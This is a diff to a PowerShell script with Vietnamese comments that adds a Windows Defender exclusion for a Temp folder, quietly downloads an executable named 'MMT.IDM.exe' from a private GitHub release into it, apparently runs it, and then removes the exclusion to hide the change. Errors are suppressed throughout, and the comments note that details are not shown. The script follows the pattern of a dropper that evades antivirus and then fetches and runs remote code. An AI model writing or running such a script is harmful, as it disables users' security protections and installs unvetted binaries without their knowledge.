@@ -1,8 +1,16 @@
+# Đường dẫn thư mục và file
+$folderPath = "$env:USERPROFILE\AppData\Local\Temp\MMTPC"
+$filePath   = Join-Path $folderPath "MMT.IDM.exe"
+
+# Tạo thư mục nếu chưa tồn tại
+if (-not (Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
+}
+
 # Thêm exclusion (không hiển thị chi tiết)
-Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp\MMTPC" -Force -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
 
 # Tải và chạy file
-$filePath = "$env:USERPROFILE\AppData\Local\Temp\MMTPC\MMT.PE.exe"
 Invoke-WebRequest -Uri "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe" -OutFile $filePath -ErrorAction SilentlyContinue
 
 if (Test-Path $filePath) {
@@ -11,6 +19,4 @@ if (Test-Path $filePath) {
 }
 
 # Xóa exclusion (không hiển thị chi tiết)
-Remove-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp\MMTPC" -Force -ErrorAction SilentlyContinue
-
-
+Remove-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
